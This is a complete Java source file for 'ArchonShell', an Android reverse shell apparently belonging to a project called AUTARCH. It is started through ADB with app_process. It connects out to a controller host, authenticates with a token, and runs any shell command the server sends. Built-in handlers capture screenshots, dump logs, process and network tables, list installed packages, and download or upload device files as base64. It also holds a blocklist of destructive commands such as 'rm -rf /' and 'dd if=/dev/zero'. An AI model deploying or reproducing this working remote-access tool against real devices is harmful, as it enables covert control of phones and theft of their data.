package com.darkhal.archon.server;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * Archon Reverse Shell — outbound shell connecting back to AUTARCH server.
 *
 * Runs via app_process at shell (UID 2000) level, same as ArchonServer.
 * Instead of LISTENING, this CONNECTS OUT to the AUTARCH server's RevShellListener.
 *
 * Started via ADB:
 *   CLASSPATH=/data/app/.../base.apk app_process /system/bin \
 *     --nice-name=archon_shell com.darkhal.archon.server.ArchonShell \
 *     <server_ip> <server_port> <auth_token> <timeout_minutes>
 *
 * Protocol (JSON over TCP, newline-delimited):
 *   Auth handshake (client → server):
 *     {"type":"auth","token":"xxx","device":"model","android":"14","uid":2000}
 *   Server response:
 *     {"type":"auth_ok"} or {"type":"auth_fail","reason":"..."}
 *
 *   Command (server → client):
 *     {"type":"cmd","cmd":"pm list packages","timeout":30,"id":"abc123"}
 *   Response (client → server):
 *     {"type":"result","id":"abc123","stdout":"...","stderr":"...","exit_code":0}
 *
 *   Special commands (server → client):
 *     {"type":"cmd","cmd":"__sysinfo__","id":"..."}
 *     {"type":"cmd","cmd":"__packages__","id":"..."}
 *     {"type":"cmd","cmd":"__screenshot__","id":"..."}
 *     {"type":"cmd","cmd":"__download__","id":"...","path":"/sdcard/file.txt"}
 *     {"type":"cmd","cmd":"__upload__","id":"...","path":"/sdcard/file.txt","data":"base64..."}
 *     {"type":"cmd","cmd":"__processes__","id":"..."}
 *     {"type":"cmd","cmd":"__netstat__","id":"..."}
 *     {"type":"cmd","cmd":"__dumplog__","id":"...","lines":100}
 *     {"type":"cmd","cmd":"__disconnect__"}
 *
 *   Keepalive (bidirectional):
 *     {"type":"ping"} → {"type":"pong"}
 */
public class ArchonShell {

    private static final String TAG = "ArchonShell";
    private static final String LOG_FILE = "/data/local/tmp/archon_shell.log";
    private static final int DEFAULT_TIMEOUT = 30;
    private static final int CONNECT_TIMEOUT_MS = 10000;
    private static final int KEEPALIVE_INTERVAL_MS = 30000;

    // Same safety blocklist as ArchonServer
    private static final String[] BLOCKED_PATTERNS = {
        "rm -rf /",
        "rm -rf /*",
        "mkfs",
        "dd if=/dev/zero",
        "reboot",
        "shutdown",
        "init 0",
        "init 6",
        "flash_image",
        "erase_image",
        "format_data",
        "> /dev/block",
    };

    private static String serverIp;
    private static int serverPort;
    private static String authToken;
    private static int timeoutMinutes;
    private static final AtomicBoolean running = new AtomicBoolean(true);
    private static long startTime;
    private static int commandCount = 0;

    public static void main(String[] args) {
        if (args.length < 4) {
            System.err.println("Usage: ArchonShell <server_ip> <server_port> <token> <timeout_minutes>");
            System.exit(1);
        }

        serverIp = args[0];
        serverPort = Integer.parseInt(args[1]);
        authToken = args[2];
        timeoutMinutes = Integer.parseInt(args[3]);
        startTime = System.currentTimeMillis();

        log("Starting Archon Shell — connecting to " + serverIp + ":" + serverPort);
        log("PID: " + android.os.Process.myPid() + " UID: " + android.os.Process.myUid());
        log("Timeout: " + timeoutMinutes + " minutes");

        // Shutdown hook
        Runtime.getRuntime().addShutdownHook(new Thread(() -> {
            log("Shutdown hook triggered");
            running.set(false);
        }));

        // Start timeout watchdog
        Thread watchdog = new Thread(() -> {
            long deadline = startTime + (timeoutMinutes * 60L * 1000L);
            while (running.get()) {
                if (System.currentTimeMillis() > deadline) {
                    log("Auto-timeout after " + timeoutMinutes + " minutes");
                    running.set(false);
                    break;
                }
                try { Thread.sleep(5000); } catch (InterruptedException e) { break; }
            }
        });
        watchdog.setDaemon(true);
        watchdog.start();

        // Connect and run shell loop
        Socket socket = null;
        try {
            socket = new Socket();
            socket.connect(new InetSocketAddress(serverIp, serverPort), CONNECT_TIMEOUT_MS);
            socket.setSoTimeout(KEEPALIVE_INTERVAL_MS * 2); // Read timeout for keepalive detection
            socket.setKeepAlive(true);

            log("Connected to " + serverIp + ":" + serverPort);

            BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            PrintWriter writer = new PrintWriter(new OutputStreamWriter(socket.getOutputStream()), true);

            // Send auth handshake
            if (!authenticate(writer, reader)) {
                log("Authentication failed — disconnecting");
                System.exit(3);
            }

            log("Authenticated — entering shell loop");

            // Main command loop: read commands from server, execute, return results
            shellLoop(reader, writer);

        } catch (IOException e) {
            log("Connection failed: " + e.getMessage());
            System.exit(2);
        } finally {
            if (socket != null) {
                try { socket.close(); } catch (IOException ignored) {}
            }
        }

        log("Shell stopped — " + commandCount + " commands executed");
        System.exit(0);
    }

    private static boolean authenticate(PrintWriter writer, BufferedReader reader) throws IOException {
        // Gather device info
        String model = getSystemProp("ro.product.model", "unknown");
        String androidVer = getSystemProp("ro.build.version.release", "unknown");
        int uid = android.os.Process.myUid();

        String authMsg = "{\"type\":\"auth\",\"token\":" + jsonEscape(authToken) +
            ",\"device\":" + jsonEscape(model) +
            ",\"android\":" + jsonEscape(androidVer) +
            ",\"uid\":" + uid + "}";

        writer.println(authMsg);
        writer.flush();

        // Wait for auth response
        String response = reader.readLine();
        if (response == null) return false;

        String type = extractJsonString(response, "type");
        if ("auth_ok".equals(type)) {
            return true;
        }

        String reason = extractJsonString(response, "reason");
        log("Auth rejected: " + (reason != null ? reason : "unknown reason"));
        return false;
    }

    private static void shellLoop(BufferedReader reader, PrintWriter writer) {
        while (running.get()) {
            try {
                String line = reader.readLine();
                if (line == null) {
                    log("Server closed connection");
                    running.set(false);
                    break;
                }

                String type = extractJsonString(line, "type");
                if (type == null) continue;

                switch (type) {
                    case "cmd":
                        handleCommand(line, writer);
                        break;
                    case "ping":
                        writer.println("{\"type\":\"pong\"}");
                        writer.flush();
                        break;
                    case "disconnect":
                        log("Server requested disconnect");
                        running.set(false);
                        break;
                    default:
                        log("Unknown message type: " + type);
                        break;
                }

            } catch (java.net.SocketTimeoutException e) {
                // Send keepalive ping
                writer.println("{\"type\":\"ping\"}");
                writer.flush();
            } catch (IOException e) {
                log("Connection error: " + e.getMessage());
                running.set(false);
                break;
            }
        }
    }

    private static void handleCommand(String json, PrintWriter writer) {
        String cmd = extractJsonString(json, "cmd");
        String id = extractJsonString(json, "id");
        int timeout = extractJsonInt(json, "timeout", DEFAULT_TIMEOUT);

        if (cmd == null || cmd.isEmpty()) {
            sendResult(writer, id, "", "No command specified", -1);
            return;
        }

        commandCount++;
        log("CMD[" + commandCount + "] " + (cmd.length() > 80 ? cmd.substring(0, 80) + "..." : cmd));

        // Handle special commands
        switch (cmd) {
            case "__sysinfo__":
                handleSysinfo(writer, id);
                return;
            case "__packages__":
                handlePackages(writer, id);
                return;
            case "__screenshot__":
                handleScreenshot(writer, id);
                return;
            case "__processes__":
                handleProcesses(writer, id);
                return;
            case "__netstat__":
                handleNetstat(writer, id);
                return;
            case "__dumplog__":
                int lines = extractJsonInt(json, "lines", 100);
                handleDumplog(writer, id, lines);
                return;
            case "__download__":
                String dlPath = extractJsonString(json, "path");
                handleDownload(writer, id, dlPath);
                return;
            case "__upload__":
                String ulPath = extractJsonString(json, "path");
                String ulData = extractJsonString(json, "data");
                handleUpload(writer, id, ulPath, ulData);
                return;
            case "__disconnect__":
                log("Disconnect command received");
                running.set(false);
                sendResult(writer, id, "Disconnecting", "", 0);
                return;
        }

        // Safety check
        if (isBlocked(cmd)) {
            log("BLOCKED dangerous command: " + cmd);
            sendResult(writer, id, "", "Command blocked by safety filter", -1);
            return;
        }

        // Execute regular shell command
        String response = executeCommand(cmd, timeout);
        writer.println(addId(response, id));
        writer.flush();
    }

    // ── Special command handlers ────────────────────────────────────

    private static void handleSysinfo(PrintWriter writer, String id) {
        StringBuilder info = new StringBuilder();
        info.append("Device: ").append(getSystemProp("ro.product.model", "?")).append("\n");
        info.append("Manufacturer: ").append(getSystemProp("ro.product.manufacturer", "?")).append("\n");
        info.append("Android: ").append(getSystemProp("ro.build.version.release", "?")).append("\n");
        info.append("SDK: ").append(getSystemProp("ro.build.version.sdk", "?")).append("\n");
        info.append("Build: ").append(getSystemProp("ro.build.display.id", "?")).append("\n");
        info.append("Kernel: ").append(getSystemProp("ro.build.kernel.id", "?")).append("\n");
        info.append("SELinux: ").append(readFile("/sys/fs/selinux/enforce", "?")).append("\n");
        info.append("UID: ").append(android.os.Process.myUid()).append("\n");
        info.append("PID: ").append(android.os.Process.myPid()).append("\n");
        info.append("Uptime: ").append((System.currentTimeMillis() - startTime) / 1000).append("s\n");
        info.append("Commands: ").append(commandCount).append("\n");

        // Disk usage
        String df = quickExec("df -h /data 2>/dev/null | tail -1", 5);
        if (df != null && !df.isEmpty()) info.append("Disk: ").append(df.trim()).append("\n");

        // Memory
        String mem = quickExec("cat /proc/meminfo | head -3", 5);
        if (mem != null) info.append(mem);

        sendResult(writer, id, info.toString(), "", 0);
    }

    private static void handlePackages(PrintWriter writer, String id) {
        String result = quickExec("pm list packages -f 2>/dev/null", 30);
        sendResult(writer, id, result != null ? result : "", result == null ? "Failed" : "", result != null ? 0 : -1);
    }

    private static void handleScreenshot(PrintWriter writer, String id) {
        // Capture screenshot to temp file, then base64 encode
        String tmpFile = "/data/local/tmp/archon_screenshot.png";
        String captureResult = quickExec("screencap -p " + tmpFile + " 2>&1", 10);

        if (captureResult == null || new File(tmpFile).length() == 0) {
            sendResult(writer, id, "", "Screenshot failed: " + (captureResult != null ? captureResult : "unknown"), -1);
            return;
        }

        // Base64 encode — read in chunks to avoid memory issues
        String b64 = quickExec("base64 " + tmpFile + " | tr -d '\\n'", 30);
        quickExec("rm " + tmpFile, 5);

        if (b64 != null && !b64.isEmpty()) {
            sendResult(writer, id, b64, "", 0);
        } else {
            sendResult(writer, id, "", "Failed to encode screenshot", -1);
        }
    }

    private static void handleProcesses(PrintWriter writer, String id) {
        String result = quickExec("ps -A -o PID,UID,STAT,NAME 2>/dev/null || ps -A 2>/dev/null", 10);
        sendResult(writer, id, result != null ? result : "", result == null ? "Failed" : "", result != null ? 0 : -1);
    }

    private static void handleNetstat(PrintWriter writer, String id) {
        StringBuilder sb = new StringBuilder();

        String tcp = quickExec("cat /proc/net/tcp 2>/dev/null", 5);
        if (tcp != null) { sb.append("=== TCP ===\n").append(tcp).append("\n"); }

        String tcp6 = quickExec("cat /proc/net/tcp6 2>/dev/null", 5);
        if (tcp6 != null) { sb.append("=== TCP6 ===\n").append(tcp6).append("\n"); }

        String udp = quickExec("cat /proc/net/udp 2>/dev/null", 5);
        if (udp != null) { sb.append("=== UDP ===\n").append(udp).append("\n"); }

        sendResult(writer, id, sb.toString(), "", 0);
    }

    private static void handleDumplog(PrintWriter writer, String id, int lines) {
        String result = quickExec("logcat -d -t " + Math.min(lines, 5000) + " 2>/dev/null", 15);
        sendResult(writer, id, result != null ? result : "", result == null ? "Failed" : "", result != null ? 0 : -1);
    }

    private static void handleDownload(PrintWriter writer, String id, String path) {
        if (path == null || path.isEmpty()) {
            sendResult(writer, id, "", "No path specified", -1);
            return;
        }

        File file = new File(path);
        if (!file.exists()) {
            sendResult(writer, id, "", "File not found: " + path, -1);
            return;
        }

        if (file.length() > 50 * 1024 * 1024) { // 50MB limit
            sendResult(writer, id, "", "File too large (>50MB): " + file.length(), -1);
            return;
        }

        String b64 = quickExec("base64 '" + path.replace("'", "'\\''") + "' | tr -d '\\n'", 60);
        if (b64 != null && !b64.isEmpty()) {
            // Send with metadata
            String meta = "{\"type\":\"result\",\"id\":" + jsonEscape(id != null ? id : "") +
                ",\"stdout\":" + jsonEscape(b64) +
                ",\"stderr\":\"\",\"exit_code\":0" +
                ",\"filename\":" + jsonEscape(file.getName()) +
                ",\"size\":" + file.length() + "}";
            writer.println(meta);
            writer.flush();
        } else {
            sendResult(writer, id, "", "Failed to read file", -1);
        }
    }

    private static void handleUpload(PrintWriter writer, String id, String path, String data) {
        if (path == null || path.isEmpty()) {
            sendResult(writer, id, "", "No path specified", -1);
            return;
        }
        if (data == null || data.isEmpty()) {
            sendResult(writer, id, "", "No data specified", -1);
            return;
        }

        // Write base64 data to temp file, then decode to destination
        String tmpFile = "/data/local/tmp/archon_upload_tmp";
        try {
            FileWriter fw = new FileWriter(tmpFile);
            fw.write(data);
            fw.close();

            String result = quickExec("base64 -d " + tmpFile + " > '" + path.replace("'", "'\\''") + "' 2>&1", 30);
            quickExec("rm " + tmpFile, 5);

            File dest = new File(path);
            if (dest.exists()) {
                sendResult(writer, id, "Uploaded " + dest.length() + " bytes to " + path, "", 0);
            } else {
                sendResult(writer, id, "", "Upload failed: " + (result != null ? result : "unknown"), -1);
            }
        } catch (IOException e) {
            sendResult(writer, id, "", "Upload error: " + e.getMessage(), -1);
        }
    }

    // ── Command execution ──────────────────────────────────────────

    private static boolean isBlocked(String cmd) {
        String lower = cmd.toLowerCase(Locale.ROOT).trim();
        for (String pattern : BLOCKED_PATTERNS) {
            if (lower.contains(pattern.toLowerCase(Locale.ROOT))) {
                return true;
            }
        }
        return false;
    }

    private static String executeCommand(String cmd, int timeoutSec) {
        try {
            ProcessBuilder pb = new ProcessBuilder("sh", "-c", cmd);
            pb.redirectErrorStream(false);
            Process process = pb.start();

            StringBuilder stdout = new StringBuilder();
            StringBuilder stderr = new StringBuilder();

            Thread stdoutThread = new Thread(() -> {
                try (BufferedReader br = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
                    String line;
                    while ((line = br.readLine()) != null) {
                        if (stdout.length() > 0) stdout.append("\n");
                        stdout.append(line);
                    }
                } catch (IOException ignored) {}
            });

            Thread stderrThread = new Thread(() -> {
                try (BufferedReader br = new BufferedReader(new InputStreamReader(process.getErrorStream()))) {
                    String line;
                    while ((line = br.readLine()) != null) {
                        if (stderr.length() > 0) stderr.append("\n");
                        stderr.append(line);
                    }
                } catch (IOException ignored) {}
            });

            stdoutThread.start();
            stderrThread.start();

            boolean completed = process.waitFor(timeoutSec, TimeUnit.SECONDS);

            if (!completed) {
                process.destroyForcibly();
                stdoutThread.join(1000);
                stderrThread.join(1000);
                return jsonResult(stdout.toString(), "Command timed out after " + timeoutSec + "s", -1);
            }

            stdoutThread.join(5000);
            stderrThread.join(5000);

            return jsonResult(stdout.toString(), stderr.toString(), process.exitValue());

        } catch (Exception e) {
            return jsonResult("", "Execution error: " + e.getMessage(), -1);
        }
    }

    /** Quick exec for internal use — returns stdout or null on failure. */
    private static String quickExec(String cmd, int timeoutSec) {
        try {
            ProcessBuilder pb = new ProcessBuilder("sh", "-c", cmd);
            pb.redirectErrorStream(true);
            Process process = pb.start();

            StringBuilder output = new StringBuilder();
            Thread reader = new Thread(() -> {
                try (BufferedReader br = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
                    String line;
                    while ((line = br.readLine()) != null) {
                        if (output.length() > 0) output.append("\n");
                        output.append(line);
                    }
                } catch (IOException ignored) {}
            });
            reader.start();

            boolean completed = process.waitFor(timeoutSec, TimeUnit.SECONDS);
            if (!completed) {
                process.destroyForcibly();
            }
            reader.join(2000);
            return output.toString();
        } catch (Exception e) {
            return null;
        }
    }

    private static String getSystemProp(String key, String defaultVal) {
        String result = quickExec("getprop " + key, 5);
        return (result != null && !result.isEmpty()) ? result.trim() : defaultVal;
    }

    private static String readFile(String path, String defaultVal) {
        String result = quickExec("cat " + path + " 2>/dev/null", 5);
        return (result != null && !result.isEmpty()) ? result.trim() : defaultVal;
    }

    // ── JSON helpers ───────────────────────────────────────────────

    private static void sendResult(PrintWriter writer, String id, String stdout, String stderr, int exitCode) {
        String msg = "{\"type\":\"result\",\"id\":" + jsonEscape(id != null ? id : "") +
            ",\"stdout\":" + jsonEscape(stdout) +
            ",\"stderr\":" + jsonEscape(stderr) +
            ",\"exit_code\":" + exitCode + "}";
        writer.println(msg);
        writer.flush();
    }

    private static String jsonResult(String stdout, String stderr, int exitCode) {
        return "{\"type\":\"result\",\"stdout\":" + jsonEscape(stdout) +
            ",\"stderr\":" + jsonEscape(stderr) +
            ",\"exit_code\":" + exitCode + "}";
    }

    private static String addId(String jsonResult, String id) {
        if (id == null || id.isEmpty()) return jsonResult;
        // Insert id field after opening brace
        return "{\"type\":\"result\",\"id\":" + jsonEscape(id) + "," + jsonResult.substring(1);
    }

    private static String jsonEscape(String s) {
        if (s == null) return "\"\"";
        StringBuilder sb = new StringBuilder("\"");
        for (int i = 0; i < s.length(); i++) {
            char c = s.charAt(i);
            switch (c) {
                case '"':  sb.append("\\\""); break;
                case '\\': sb.append("\\\\"); break;
                case '\b': sb.append("\\b"); break;
                case '\f': sb.append("\\f"); break;
                case '\n': sb.append("\\n"); break;
                case '\r': sb.append("\\r"); break;
                case '\t': sb.append("\\t"); break;
                default:
                    if (c < 0x20) {
                        sb.append(String.format("\\u%04x", (int) c));
                    } else {
                        sb.append(c);
                    }
            }
        }
        sb.append("\"");
        return sb.toString();
    }

    private static String extractJsonString(String json, String key) {
        String search = "\"" + key + "\"";
        int idx = json.indexOf(search);
        if (idx < 0) return null;

        idx = json.indexOf(':', idx + search.length());
        if (idx < 0) return null;
        idx++;

        while (idx < json.length() && json.charAt(idx) == ' ') idx++;
        if (idx >= json.length() || json.charAt(idx) != '"') return null;
        idx++;

        StringBuilder sb = new StringBuilder();
        while (idx < json.length()) {
            char c = json.charAt(idx);
            if (c == '\\' && idx + 1 < json.length()) {
                char next = json.charAt(idx + 1);
                switch (next) {
                    case '"':  sb.append('"');  break;
                    case '\\': sb.append('\\'); break;
                    case 'n':  sb.append('\n'); break;
                    case 'r':  sb.append('\r'); break;
                    case 't':  sb.append('\t'); break;
                    default:   sb.append(next); break;
                }
                idx += 2;
            } else if (c == '"') {
                break;
            } else {
                sb.append(c);
                idx++;
            }
        }
        return sb.toString();
    }

    private static int extractJsonInt(String json, String key, int defaultVal) {
        String search = "\"" + key + "\"";
        int idx = json.indexOf(search);
        if (idx < 0) return defaultVal;

        idx = json.indexOf(':', idx + search.length());
        if (idx < 0) return defaultVal;
        idx++;

        while (idx < json.length() && json.charAt(idx) == ' ') idx++;

        StringBuilder sb = new StringBuilder();
        while (idx < json.length() && (Character.isDigit(json.charAt(idx)) || json.charAt(idx) == '-')) {
            sb.append(json.charAt(idx));
            idx++;
        }

        try {
            return Integer.parseInt(sb.toString());
        } catch (NumberFormatException e) {
            return defaultVal;
        }
    }

    // ── Logging ────────────────────────────────────────────────────

    private static void log(String msg) {
        String timestamp = new SimpleDateFormat("HH:mm:ss", Locale.US).format(new Date());
        String line = timestamp + " [" + TAG + "] " + msg;
        System.out.println(line);

        try {
            FileWriter fw = new FileWriter(LOG_FILE, true);
            fw.write(line + "\n");
            fw.close();
        } catch (IOException ignored) {}
    }
}
